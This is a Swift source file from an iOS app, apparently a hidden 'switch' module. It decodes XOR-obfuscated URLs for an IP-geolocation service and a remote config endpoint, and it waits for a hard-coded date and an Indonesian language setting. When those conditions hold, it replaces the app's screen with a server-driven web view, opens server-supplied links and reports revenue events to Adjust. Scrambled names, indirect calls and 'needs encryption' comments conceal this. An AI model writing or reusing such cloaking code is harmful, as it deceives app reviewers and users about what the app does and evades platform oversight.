
import Foundation
import UIKit
import AdjustSdk

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Lianeoid(_ input: String) -> String? {
    let k: UInt8 = 49
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let KIoenHEU = "WUVFQUILHh5QQVgfXEgcWEEfWF4eRwMeWEEfW0JeXw=="         //Ip ur

//https://mock.apipost.net/mock/60e223000c88000/?apipost_id=e2241fa305002
internal let KOeinahe = "WUVFQUILHh5cXlJaH1BBWEFeQkUfX1RFHlxeUloeBwFUAwMCAQEBUgkJAQEBHg5QQVhBXkJFblhVDFQDAwUAV1ACAQQBAQM="

// https://raw.githubusercontent.com/jduja/spont/main/spon.jpg
//internal let kEtazsud = "CBQUEBNaT08SARdOBwkUCBUCFRMFEgMPDhQFDhROAw8NTwoEFQoBTxMQDw4UTw0BCQ5PExAPDk4KEAc="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Jidoeuna() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            let tp = ws.windows.first!.rootViewController! as! UINavigationController
//            let tp = ws.windows.first!.rootViewController!
            for view in tp.topViewController!.view.subviews {
                if view.tag == 20 {
                    view.removeFromSuperview()
                }
            }
        }
    }
    
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Fiuanoem() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Jidoeuna
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Knaieouy(_ dt: Maheyaue) {
    DispatchQueue.main.async {
        let vc = UnaofmeyfViewController()
        vc.dloein = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Sieouaune(_ param: Maheyaue) {
    let fName = ""

    typealias rushBlitzIusj = (Maheyaue) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Knaieouy
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func Diaoeoahe(_ dic: [String : String], etDic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic[DT] {
        dataDic = data.stringTo()
    }
    
    let name = dic[Nam]
    print(name!)
        
    //是否包含要发送的事件
    if etDic.keys.contains(name!) {
        let ade = ADJEvent(eventToken: etDic[name!]!)
//        if MatrixTyydgPPks.contains(name!) {
        if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
            ade?.setRevenue(Double(amt)!, currency: cuy as! String)
        }
        if let amt = dataDic![amt] as? Int, let cuy = dataDic![ren] {
            ade?.setRevenue(Double(amt), currency: cuy as! String)
        }
        if let amt = dataDic![amt] as? Double, let cuy = dataDic![ren] {
            ade?.setRevenue(amt, currency: cuy as! String)
        }
//        }
        Adjust.trackEvent(ade)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}



internal func WEiaoene(_ param: [String : String], _ param2: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String], [String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : Diaoeoahe
    ]
    
    fctn[fName]?(param, param2)
}


internal struct Mnaiepoau: Decodable {

    let country: Loapue?
    
    struct Loapue: Decodable {
        let code: String
    }

}

internal struct Maheyaue: Decodable {
    let vnjaie: [String]?
    
    let gdiaope: [String : String]?           // a i d
    let reioav: String?         //key arr
    let wkaovn: String?         // shi fou kaiqi
    let loienyu: [String]?            // yeu nan xianzhi
    let doaivu: String?         // jum
    let wpaonre: String?          // backcolor
    let msoiuns: Int?          // too btn
    let toisal: String?
    let lismpo: String?  // bri co
    let setrae: String?   //ad key
    let mdoiquc: Int?   // lang kongzhi
}

//internal func HaoeiuOOIS() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "rota") != nil {
//            Fiuanoem()
//        } else {
//            UdnaioKoale()
//        }
//    } else {
//        Fiuanoem()
//    }
//}
//
//// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Bgsyeoj() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: HaoeiuOOIS
//    ]
//    
//    fctn[fName]?()
//}


func isTm() -> Bool {
   
  // 2026-04-08 16:16:48
  //1775636208
  let ftTM = 1775636208
  let ct = Date().timeIntervalSince1970
  if ftTM - Int(ct) > 0 {
    return false
  }
  return true
}

func iPLIn() -> Bool {
    // 获取用户设置的首选语言（列表第一个）
    guard let cysh = Locale.preferredLanguages.first else {
        return false
    }
    // 印尼语代码：id 或 in（兼容旧版本）
    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
}

//func bahsiKlaisjd() -> Bool {
////    guard let receiptURL = Bundle.main.appStoreReceiptURL else { return false }
////     if (receiptURL.lastPathComponent.contains("boxRe")) {
////         return true
////     }
//    
//    
////    let offset = NSTimeZone.system.secondsFromGMT() / 3600
////    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
////        return true
////    }
//    
//    return false
//}

//func contraintesRiuaogOKuese() -> Bool {
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if offset > 6 && offset < 9 {
//        return true
//    }
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}

